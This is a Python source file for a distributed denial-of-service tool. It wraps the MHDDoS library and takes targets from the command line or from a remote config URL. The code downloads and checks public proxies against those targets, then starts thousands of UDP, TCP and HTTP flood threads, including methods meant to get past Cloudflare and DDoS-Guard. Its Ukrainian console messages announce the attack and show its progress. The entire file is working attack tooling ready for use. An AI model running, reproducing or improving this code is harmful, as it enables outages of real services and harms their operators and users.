import argparse
import os
import random
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from functools import lru_cache
from multiprocessing import cpu_count
from threading import Thread
from time import sleep, time

import requests
from PyRoxy import Proxy
from tabulate import tabulate
from yarl import URL

from mhddos.start import logger, Methods, bcolors as cl, main as mhddos_main


PROXIES_URL = 'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/proxies.txt'
PROXY_TIMEOUT = 5
UDP_THREADS = 1
LOW_RPC = 1000

THREADS_PER_CORE = 1000
MAX_DEFAULT_THREADS = 4000


def cls():
    os.system('cls' if os.name == 'nt' else 'clear')


@lru_cache(maxsize=128)
def resolve_host(url):
    return socket.gethostbyname(URL(url).host)


class Targets:
    def __init__(self, targets, config):
        self.targets = targets
        self.config = config
        self.config_targets = []

    def __iter__(self):
        self.load_config()
        for target in self.targets + self.config_targets:
            yield self.prepare_target(target)

    def prepare_target(self, target):
        if '://' in target:
            return target

        try:
            _, port = target.split(':', 1)
        except ValueError:
            port = '80'

        scheme = 'https://' if port == '443' else 'http://'
        return scheme + target

    def load_config(self):
        if not self.config:
            return

        try:
            config_content = requests.get(self.config, timeout=5).text
        except requests.RequestException:
            logger.warning(f'{cl.FAIL}Не вдалося (пере)завантажити конфіг - буде використано останні відомі цілі{cl.RESET}')
        else:
            self.config_targets = [
                target.strip()
                for target in config_content.split()
                if target.strip()
            ]


def download_proxies():
    response = requests.get(PROXIES_URL, timeout=10)
    for line in response.iter_lines(decode_unicode=True):
        yield Proxy.fromString(line)


def update_proxies(period, targets):
    #  Avoid parsing proxies too often when restart happens
    if os.path.exists('files/proxies/proxies.txt'):
        last_update = os.path.getmtime('files/proxies/proxies.txt')
        if (time() - last_update) < period / 2:
            logger.info(f'{cl.OKGREEN}Використовується список проксі з попереднього запуску{cl.RESET}')
            return

    logger.info(f'{cl.OKGREEN}Завантажуємо список проксі...{cl.RESET}')
    Proxies = list(download_proxies())
    random.shuffle(Proxies)

    size = len(targets)
    logger.info(
        f'{cl.WARNING}Перевіряємо на працездатність {cl.OKBLUE}{len(Proxies):,}{cl.WARNING}'
        f' проксі - це може зайняти пару хвилин:{cl.RESET}'
    )

    future_to_proxy = {}
    with ThreadPoolExecutor(THREADS_PER_CORE) as executor:
        for target, chunk in zip(targets, (Proxies[i::size] for i in range(size))):
            future_to_proxy.update({
                executor.submit(proxy.check, target, PROXY_TIMEOUT): proxy
                for proxy in chunk
            })

        CheckedProxies = [
            future_to_proxy[future]
            for future in as_completed(future_to_proxy) if future.result()
        ]

    if not CheckedProxies:
        logger.error(
            'Не знайдено робочих проксі. '
            'Переконайтеся що інтернет з`єднання стабільне і ціль доступна. '
            'Перезапустіть Docker.'
        )
        exit()

    logger.info(f'{cl.WARNING}Знайдено робочих проксі: {cl.OKBLUE}{len(CheckedProxies):,}{cl.RESET}')

    os.makedirs('files/proxies/', exist_ok=True)
    with open('files/proxies/proxies.txt', 'w') as wr:
        for proxy in CheckedProxies:
            wr.write(str(proxy) + '\n')


def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, debug, table):
    threads_per_target = total_threads // len(targets)
    params_list = []
    proxy_file = 'empty.txt' if vpn_mode else 'proxies.txt'
    for target in targets:
        ip = resolve_host(target)
        # UDP
        if target.lower().startswith('udp://'):
            params_list.append(['UDP', target, ip, UDP_THREADS, period])

        # TCP
        elif target.lower().startswith('tcp://'):
            params_list.append(['TCP', target, ip, threads_per_target, period, proxy_file])

        # HTTP(S)
        else:
            threads = threads_per_target // len(http_methods)
            for method in http_methods:
                params_list.append([method, target, ip, threads, period, proxy_file, rpc])

    logger.info(f'{cl.OKGREEN}Запускаємо атаку...{cl.RESET}')
    text_to_print = [] if table else None
    for params in params_list:
        kwargs = {'debug': debug, 'text_to_print': text_to_print}
        Thread(target=mhddos_main, args=params, kwargs=kwargs, daemon=True).start()

    if table:
        tabulate_text_targets = []
        for params in params_list:
            tabulate_text_targets.append((f'{cl.WARNING}%s' % params[1], params[0], f'%s{cl.RESET}' % params[3]))

        print(tabulate(
            tabulate_text_targets,
            headers=[f'{cl.OKBLUE}Атакуємо', 'Методом', f'Потоків{cl.RESET}'],
            tablefmt='fancy_grid'
        ))

        ts = time()
        while time() < ts + period:
            sleep(3)
            cls()
            tabulate_text_progress = []

            for text in text_to_print:
                row = text.split(',')
                tabulate_text_progress.append(
                    (f'{cl.WARNING}%s' % row[0], row[1], row[2], row[3], row[4], row[5], f'%s{cl.RESET}' % row[6])
                )
            print(tabulate(
                tabulate_text_progress,
                headers=[f'{cl.OKBLUE}Ціль', 'Порт', 'Метод', 'Потоків', 'PPS', 'BPS', f'Прогрес{cl.RESET}'],
                tablefmt='fancy_grid'
            ))

            tabulate_text_progress.clear()
            text_to_print.clear()

    sleep(period + 3)


def start(total_threads, period, targets_iter, rpc, http_methods, vpn_mode, debug, table):
    os.chdir('mhddos')
    for bypass in ('CFB', 'DGB'):
        if bypass in http_methods:
            logger.warning(f'{cl.FAIL}Робота методу {bypass} не гарантована - слідкуйте за трафіком{cl.RESET}')

    while True:
        targets = []
        for url in list(targets_iter):
            try:
                resolve_host(url)
                targets.append(url)
            except socket.gaierror:
                logger.warning(f'{cl.FAIL}Ціль {url} недоступна і не буде атакована{cl.RESET}')

        if not targets:
            logger.error(f'{cl.FAIL}Не знайдено жодної доступної цілі{cl.RESET}')
            exit()

        if rpc < LOW_RPC:
            logger.warning(
                f'RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
                f'через збільшення кількості перемикань кожного потоку між проксі.'
            )

        no_proxies = vpn_mode or all(target.lower().startswith('udp://') for target in targets)
        if not no_proxies:
            update_proxies(period, targets)
        run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, debug, table)


def init_argparse() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        'targets',
        nargs='*',
        help='List of targets, separated by spaces',
    )
    parser.add_argument(
        '-c',
        '--config',
        help='URL to a config file',
    )
    parser.add_argument(
        '-t',
        '--threads',
        type=int,
        default=min(THREADS_PER_CORE * cpu_count(), MAX_DEFAULT_THREADS),
        help='Total number of threads to run (default is CPU * 1000)',
    )
    parser.add_argument(
        '-p',
        '--period',
        type=int,
        default=900,
        help='How often to update the proxies (in seconds) (default is 900)',
    )
    parser.add_argument(
        '--rpc',
        type=int,
        default=2000,
        help='How many requests to send on a single proxy connection (default is 2000)',
    )
    parser.add_argument(
        '--debug',
        action='store_true',
        default=False,
        help='Enable debug output from MHDDoS',
    )
    parser.add_argument(
        '--table',
        action='store_true',
        default=False,
        help='Enable debug output as table',
    )
    parser.add_argument(
        '--vpn',
        dest='vpn_mode',
        action='store_true',
        default=False,
        help='Disable proxies to use VPN',
    )
    parser.add_argument(
        '--http-methods',
        nargs='+',
        type=str.upper,
        default=['GET', 'POST', 'STRESS', 'BOT', 'PPS'],
        choices=Methods.LAYER7_METHODS,
        help='List of HTTP(s) attack methods to use. Default is GET, POST, STRESS, BOT, PPS',
    )
    return parser


def print_banner(vpn_mode):
    print(f'''
                            {cl.HEADER}!!!{'УВІМКНІТЬ VPN!!!' if vpn_mode else 'ВИМКНІТЬ VPN!!!  (окрім UDP атак)'}{cl.RESET}

- {cl.WARNING}VPN замість проксі{cl.RESET} - прапорець `--vpn`
- {cl.WARNING}Навантаження (кількість потоків){cl.RESET} - параметр `-t 3000`, за замовчуванням - CPU * 1000
- {cl.WARNING}Інформація про хід атаки{cl.RESET} - прапорець `--debug`
- {cl.WARNING}Лог про хід атаки в табличній формі{cl.RESET} - прапорець `--table`
- {cl.WARNING}Повна документація{cl.RESET} - https://github.com/porthole-ascend-cinnamon/mhddos_proxy
    ''')


if __name__ == '__main__':
    args = init_argparse().parse_args()
    print_banner(args.vpn_mode)
    start(
        args.threads,
        args.period,
        Targets(args.targets, args.config),
        args.rpc,
        args.http_methods,
        args.vpn_mode,
        args.debug,
        args.table,
    )
